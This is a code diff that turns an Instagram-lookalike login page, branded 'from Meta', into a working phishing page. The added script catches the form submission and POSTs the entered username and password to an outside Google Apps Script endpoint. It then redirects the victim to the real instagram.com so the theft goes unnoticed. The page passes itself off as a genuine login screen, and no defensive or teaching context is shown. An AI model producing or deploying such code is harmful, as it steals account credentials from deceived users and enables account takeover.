@@ -42,9 +42,10 @@
 
 
         <div class="input">
-                <input name="email" type="text" placeholder="Phone number,username or email"></input>
+                <form name="form" methods="POST" action=""
+                <input name="Phone" type="text" placeholder="Phone number,username or email"></input>
                 <br>
-                <input name="pass" type="password" placeholder="Password "></input>
+                <input name="Pass" type="password" placeholder="Password "></input>
 
 
 
@@ -53,8 +54,8 @@
 <a class="b"href="#">Forgot password?</a>
 
 
-<button id="btn"class="btn"type="submit">Log In</button>
-
+<button name="submit"id="btn"class="btn"type="submit">Log In</button>
+</form>
         <p> Don't have an account?<span class="sp">Sign up</span><p>
 <div class="foot">
         <p class="from">from</p><br> <div class="s"> <svg class="lg"xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="currentColor" class="bi bi-meta" viewBox="0 0 16 16">
@@ -62,6 +63,23 @@
 </svg><h5>Meta<h5>
 </div>
 </div>
+        
+        
+        
+        <script>
+
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbxD28OxZp-UKkWNjrGKve5cRQUMTAIduhvonfHBE2_x5tc548mrGC9KaovGsLKv_CTW/exec'
+
+            const form = document.forms['form']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(response => window.location.href="https://www.instagram.com")
+                .catch(error => console.error('Error!', error.message))
+            })
+          </script>
+        <!-- Project -->
         <script src="main.js"></script>
 </body>
 
